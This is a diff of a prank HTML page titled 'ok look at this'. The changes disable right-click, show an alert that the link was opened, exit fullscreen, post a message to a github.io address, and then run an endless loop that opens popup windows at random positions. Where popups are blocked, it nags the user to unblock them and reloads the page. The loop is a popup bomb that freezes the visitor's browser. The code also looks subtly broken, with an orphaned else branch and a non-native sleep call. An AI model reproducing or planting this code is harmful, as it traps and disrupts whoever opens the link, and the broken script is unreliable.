@@ -1,5 +1,6 @@
 <html>
 <body>
+  <body oncontextmenu="return false;">
 <div>
   <b>ok look at this</b>
     <script>
@@ -21,11 +22,11 @@
 }
   
   
-  const response = confirm("yayyy u clicked this link!!!")
-     if (response) {
-       document.exitFullscreen ()
+    alert("yayyy you opened the link!!!")
+ 
+       document.documentElement.exitFullscreen ()
        window.postMessage('hi', 'https://mcma-keystone.github.io/cretinsgotbullcrap/haha');
-       sleep(20000)
+       sleep(5000)
            
            for(;;) {
                window.open("", "_blank", "toolbar=yes,top="+String(Math.random()*1000)+",left="+String(Math.random()*1000)+",width=800,height=400");
@@ -42,7 +43,7 @@
      else {
                     
        alert("unblock popups please!!!")
-    
+       sleep (2000)
        location.reload;
      }
         
